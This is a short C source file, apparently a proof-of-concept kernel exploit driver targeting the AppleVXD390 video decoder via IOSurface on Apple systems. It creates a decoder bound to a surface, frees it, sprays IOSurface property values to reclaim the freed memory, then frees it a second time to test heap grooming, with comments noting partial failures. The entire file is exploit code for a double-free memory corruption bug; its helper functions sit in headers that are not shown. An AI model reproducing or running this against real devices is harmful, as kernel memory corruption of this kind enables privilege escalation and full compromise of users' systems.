#include <stdio.h>
#include <IOKit/IOKitLib.h>
#include <stdlib.h>
#include <string.h>

#include "iosurface.h"
#include "applevxd390.h"

int main(int argc, char* argv[]) {
	io_connect_t iosurface_conn = openIOSurfaceConnection();
	if (iosurface_conn == MACH_PORT_NULL) {
		printf("Could not open connection to IOSurface\n");
		return 1;
	}
	uint32_t surface_id = createSurface(iosurface_conn);

	if (!surface_id) {
		printf("Could not create surface\n");
		return 1;
	}

	printf("surface ID: %x\n", surface_id);

	io_connect_t applevxd390_conn = createDecoder(surface_id);
	if (applevxd390_conn == MACH_PORT_NULL) {
		printf("Could not create decoder\n");
		return 1;
	}

	// first free
	if (!destroyDecoder(applevxd390_conn)) {
		printf("Could not destroy decoder\n");
		return 1;
	}

	// this should take up the freed spot
	if (setValueSpray(iosurface_conn, surface_id)) {
		printf("Could not set value spray\n");
		// return 1; // this always returns fail?????
	}
	
	// second free
	// this shouldnt crash immediately if the data got placed where our freed object was
	if (!destroyDecoder(applevxd390_conn)) {
		printf("Could not destroy decoder\n");
		// return 1; // this fails due to corrupted object
	}

	printf("Didn't immediately crash\n");

	while (true) {
		
	}

	return 0;
}
